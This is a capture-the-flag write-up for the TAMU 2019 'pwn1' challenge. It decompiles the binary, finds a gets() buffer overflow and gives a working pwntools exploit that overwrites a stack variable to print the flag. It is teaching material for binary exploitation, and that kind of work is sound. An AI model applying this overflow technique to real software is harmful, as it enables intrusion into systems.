# Tamu19 pwn1

Let's take a look at the binary:

```
$    file pwn1
pwn1: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd7aa1accb16feac888c99841f504, not stripped
$    pwn checksec pwn1
[*] '/Hackery/pod/modules/bof_variable/tamu19_pwn1/pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
$    ./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
15935728
I don't know that! Auuuuuuuugh!
```

So we can see that it is a `32` bit binary with RELRO, a Non-Executable Stack, and PIE (those binary mitigations will be discussed later). We can see that when we run the binary, it prompts us for input, and prints some text. When we take a look at the main function in Ghidra we see this:

```
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
/* WARNING: Removing unreachable block (ram,0x000108bb) */

undefined4 main(void)

{
  int strcmpResult0;
  int strcmpResult1;
  char input [43];
 
  setvbuf(stdout,(char *)0x2,0,0);
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere theother side he see."
      );
  puts("What... is your name?");
  fgets(input,0x2b,stdin);
  strcmpResult0 = strcmp(input,"Sir Lancelot of Camelot\n");
  if (strcmpResult0 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(input,0x2b,stdin);
  strcmpResult1 = strcmp(input,"To seek the Holy Grail.\n");
  if (strcmpResult1 == 0) {
    puts("What... is my secret?");
    gets(input);
    puts("I don\'t know that! Auuuuuuuugh!");
    return 0;
  }
  puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

So right off the back, we can see we are dealing with a reference to one of the greatest movies ever (Monty Python and the Holy Grail). We can see that it will scan in input into `input` using `fgets`, then compares our input with `strcmp`. It does this twice. The first time it checks for the string `Sir Lancelot of Camelot\n` and the second time it checks for the string `To seek the Holy Grail.\n`. If we don't pass the check the first time, it will print `I don\'t know that! Auuuuuuuugh!` and exit. For the second check if we pass it, the code will call the function `gets` with `input` as an argument. The function `gets` will scan in data until it either gets a newline character or an EOF. As a result on paper there is no limit to how much it can scan into memory. Since the are it is scanning into is finite, we will be able to overflow it and start overwriting subsequent things in memory.

Also looking at the assembly code for around the `gets` call, we see something interesting that the decompiled code doesn't show us:
```
        000108aa e8 71 fc        CALL       gets                                             char * gets(char * __s)
                 ff ff
        000108af 83 c4 10        ADD        ESP,0x10
        000108b2 81 7d f0        CMP        dword ptr [EBP + local_18],0xdea110c8
                 c8 10 a1 de
        000108b9 75 07           JNZ        LAB_000108c2
        000108bb e8 3d fe        CALL       print_flag                                       undefined print_flag()
                 ff ff
```

So we can see that it compares the contents of `local_18` to `0xdea110c8`, and if it is equal (which would mean it's zero) it calls the `print_flag` function. Looking at the decompiled code for `print_flag`, we see that it prints the contents of `flag.txt`:
```
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void print_flag(void)

{
  FILE *flagFile;
  int flag;
 
  puts("Right. Off you go.");
  flagFile = fopen("flag.txt","r");
  while( true ) {
    flag = _IO_getc((_IO_FILE *)flagFile);
    if ((char)flag == -1) break;
    putchar((int)(char)flag);
  }
  putchar(10);
  return;
}
```

So if we can use the `gets` call to overwrite the contents of `local_18` to `0xdea110c8`, we should get the flag (if you're running this locally you will need to have a copy of `flag.txt` that is in the same directory as the binary). So in order to reach the `gets` call, we will need to send the program the string `Sir Lancelot of Camelot\n` and `To seek the Holy Grail.\n`. Looking at the stack layout in Ghidra (we can see it by double clicking on any of the variables in the variable declarations for the main function) shows us the offset between the start of our input and `local_18`:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main(undefined1 param_1)
             undefined         AL:1           <RETURN>                                XREF[2]:     00010807(W),
                                                                                                   00010869(W)  
             undefined1        Stack[0x4]:1   param_1                                 XREF[1]:     00010779(*)  
             int               EAX:4          strcmpResult0                           XREF[1]:     00010807(W)  
             int               EAX:4          strcmpResult1                           XREF[1]:     00010869(W)  
             undefined4        Stack[0x0]:4   local_res0                              XREF[1]:     00010780(R)  
             undefined1        Stack[-0x10]:1 local_10                                XREF[1]:     000108d9(*)  
             undefined4        Stack[-0x14]:4 local_14                                XREF[1]:     000107ad(W)  
             undefined4        Stack[-0x18]:4 local_18                                XREF[2]:     000107b4(W),
                                                                                                   000108b2(R)  
             char[43]          Stack[-0x43]   input                                   XREF[5]:     000107ed(*),
                                                                                                   00010803(*),
                                                                                                   0001084f(*),
                                                                                                   00010865(*),
                                                                                                   000108a6(*)  
                             main                                            XREF[5]:     Entry Point(*),
                                                                                          _start:000105e6(*), 00010ab8,
                                                                                          00010b4c(*), 00011ff8(*)  
        00010779 8d 4c 24 04     LEA        ECX=>param_1,[ESP + 0x4]

```

So we can see that `input` starts at offset `-0x43`. We see that `local_18` starts at offset `-0x18`. This gives us an offset of `0x43 - 0x18 = 0x2b` between the start of our input and `local_18`. Then we can just overflow it (write more data to a region than it can hold, so it spills over and starts overwriting subsequent things in memory) and overwrite `local_18` with `0xdea110c8`. Putting it all together we get the following exploit:

```
# Import pwntools
from pwn import *

# Establish the target process
target = process('./pwn1')

# Make the payload
payload = ""
payload += "0"*0x2b # Padding to `local_18`
payload += p32(0xdea110c8) # the value we will overwrite local_18 with, in little endian

# Send the strings to reach the gets call
target.sendline("Sir Lancelot of Camelot")
target.sendline("To seek the Holy Grail.")

# Send the payload
target.sendline(payload)

target.interactive()
```

When we run it:
```
$    python exploit.py
[+] Starting local process './pwn1': pid 12060
[*] Switching to interactive mode
[*] Process './pwn1' stopped with exit code 0 (pid 12060)
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
Right. Off you go.
flag{g0ttem_b0yz}

[*] Got EOF while reading in interactive
$
[*] Got EOF while sending in interactive
```

Just like that, we got the flag!